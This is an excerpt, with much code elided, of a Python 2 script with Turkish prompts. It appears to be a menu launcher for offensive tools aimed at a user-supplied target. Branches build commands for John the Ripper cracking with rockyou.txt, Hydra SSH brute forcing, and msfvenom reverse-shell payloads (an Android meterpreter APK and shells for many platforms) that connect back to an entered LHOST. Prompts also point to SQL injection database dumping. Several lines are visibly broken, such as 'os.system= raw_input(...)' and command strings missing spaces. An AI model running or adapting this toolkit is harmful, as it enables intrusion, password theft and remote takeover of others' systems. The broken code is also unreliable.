...
uygulamano= raw_input("Numara Giriniz : ")
...
if(uygulamano == "1"):
	...
	taramano= raw_input("Tarama Seklini Sec : ")
	...
	if(taramano == "3"):
		...
		kayityeri= raw_input("Kayit Etmek Istediginiz Yeri Giriniz: ")
		hedefip= raw_input("Hedef Ip Giriniz: ")
...
if(uygulamano == "2"):
	...
	sifreno= raw_input("Kullanmak Istedigin Sifreyi Sec : ")
	
	if(sifreno == "1"):

		hedefurl= raw_input("Hedef Url Giriniz : ")
	...
	if(sifreno == "7"):		
		...
		hedefurl= raw_input("Hedef Url Giriniz : ")
		dosyauzanti= raw_input("Taramak Istediginiz Dosya Uzantilarini Giriniz : ")
...
if(uygulamano == "3"):
	...
	hedefurl= raw_input("Lutfen Url Giriniz : ")
...
if(uygulamano == "4"):
	...
	sqlno= raw_input("Numara Giriniz : ")
	...
	if(sqlno == "1"):
		...
		siteno= raw_input("Numara Giriniz : ")
		...
		if(siteno == "1"):
			...
			ogrenmeno= raw_input("Dokmek Istediginiz Secenegi Secin : ")
			...
			if(ogrenmeno == "2"):
				...
				databaseno= raw_input("Veritabani Ismi Giriniz : ")
				hedefurl= raw_input("Hedef Url Giriniz : ")	
			...
			if(ogrenmeno == "3"):
				...
				databaseno= raw_input("Veritabani Ismi Giriniz : ")
				tablesno= raw_input("Tablo Ismi Giriniz : ")	
				hedefurl= raw_input("Hedef Url Giriniz : ")
			...
			if(ogrenmeno == "4"):
				...
				databaseno= raw_input("Veritabani Ismi Giriniz : ")
				tablesno= raw_input("Tablo Ismi Giriniz : ")
				columnsno= raw_input("Stun Ismi Giriniz : ")
				hedefurl= raw_input("Hedef Url Giriniz : ")
	...
	if(sqlno == "2"):
		...
		taramano= raw_input("Taramak Istediginiz Numara : ")

		if(taramano == "1"):

			hedefdosya= raw_input("Dosya'nin Bulundugu Konumu Giriniz : ")
		...
		if(taramano == "4"):
			...
			databaseno= raw_input("Veritabani Ismi Giriniz : ")
			tablesno= raw_input("Tablo Ismi Giriniz : ")
			columnsno= raw_input("Sutun Ismi Giriniz : ")
...
if(uygulamano == "5"):
	...
	taramano= raw_input("Numara Giriniz : ")
	...
	if(taramano == "2"):
		...
		hedefurl= raw_input("Hedef Url Giriniz : ")
		hedefisim= raw_input("Hedef Kullanici Ismini Giriniz : ")
	...
	if(taramano == "3"):
		...
		hedefurl= raw_input("Hedef Url Giriniz : ")
		hedefisim= raw_input("Hedef Kullanici Ismini Giriniz : ")
		sifreno= raw_input("Kullanmak Istediginiz Sifre Listesini Giriniz : ")
...
if(uygulamano == "6"):
	...
	sifreno= raw_input("Numara Giriniz : ")

	if(sifreno == "1"):

		hedefdosya= raw_input("Sifre'nin Bulundugu Yeri Giriniz : ")
		os.system("john" + hedefdosya + " --wordlist=/usr/share/wordlists/rockyou.txt" )

	if(sifreno == "2"):

		hedefdosya= raw_input("Sifre'nin Bulundugu Yeri Giriniz : ")
		passwd= raw_input ("Sifre Listesini Giriniz : ")
...
if(uygulamano == "7"):
	...
	payloadno= raw_input("Trojen Ismi Giriniz : ")
	...
	if(payloadno == "1"):
		...
		exploitno= raw_input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.apk) : ")
			os.system= raw_input("msfvenom -p android/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f apk -o" + kayityeri )
		...
		if(exploitno == "2"):
			...
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.apk) : ")
			os.system= raw_input("msfvenom -p android/shell/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f apk -o" + kayityeri )
	...
	if(payloadno == "2"):
   	...
   	if(payloadno == "3"):
   		...
   		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.aspx) : ")
	...
	if(payloadno == "4"):
		...
		exploitno= raw_input("Payload Turunu Giriniz : ")
   		...
   		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.sh) : ")
	...
	if(payloadno == "5"):
		...
		exploitno= raw_input("Payload Turunu Giriniz : ")
   		...
   		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.jsp) : ")
	...
	if(payloadno == "6"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.elf) : ")
	...
	if(payloadno == "7"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.macho) : ")
	...
	if(payloadno == "8"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.pl) : ")
	...
	if(payloadno == "9"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.php) : ")
	...
	if(payloadno == "10"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.ps1) : ")
	...
	if(payloadno == "11"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.py) : ")
	...
	if(payloadno == "12"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.war) : ")
	...
	if(payloadno == "13"):
		...
		if(exploitno == "1"):
			...
			lhost= raw_input("Kendi Ip'nizi Giriniz : ")
			lport= raw_input("Portu Giriniz : ")
			kayityeri= raw_input("Kayit Yerini Giriniz (shell.exe) : ")
...
if(uygulamano == "8"):
	...
	baseno= raw_input("Numara Giriniz : ")

	if(baseno == "1"):

		sifrehash= raw_input("Kirilicek Hash'i Giriniz : ")
...
if(uygulamano == "9"):
	...
	serverno= raw_input("Numara Giriniz : ")

	if(serverno == "1"):

		port= raw_input("Port Numarasini Giriniz : ")
...
if(uygulamano == "10"):
	...
	hydrano= raw_input("Numara Giriniz : ")
	...
	if(hydrano == "1"):
		...
		sshno= raw_input("Numara Giriniz : ")

		if(sshno == "1"):

			username= raw_input("Username Giriniz : ")
			passlist= raw_input("Pass Listesini Giriniz : ")
			hedefip= raw_input("Hedef Ip Giriniz : ")
			os.system("hydra -l " + username + " -P " + passlist + " " + hedefip + " -t 4 ssh " )

		if(sshno == "2"):

			username= raw_input("User Listesini Giriniz : ")
			passlist= raw_input("Password Giriniz : ")
			hedefip= raw_input("Hedef Ip Giriniz : ")
			os.system("hydra -L" + username + " -p" + passlist + "" + hedefip + " -t 4 ssh" )
	...
	if(hydrano == "2"):
		...
		ftpno= raw_input("Numara Giriniz : ")
	...
	if(hydrano == "3"):
		...
		formno= raw_input("Numara Giriniz : ")
		...
		if(formno == "1"):
			...
			passlist= raw_input("Pass Listesini Giriniz : ")
			hedefip= raw_input("Hedef Ip Giriniz : ")
			login= raw_input("Giris Sekmesini Giriniz : ")
			userw= raw_input("^User^= Giriniz : ")
			passw= raw_input("^Pass^= Giriniz : ")
...
if(uygulamano == "11"):
	...
	sambano= raw_input("Numara Giriniz : ")	
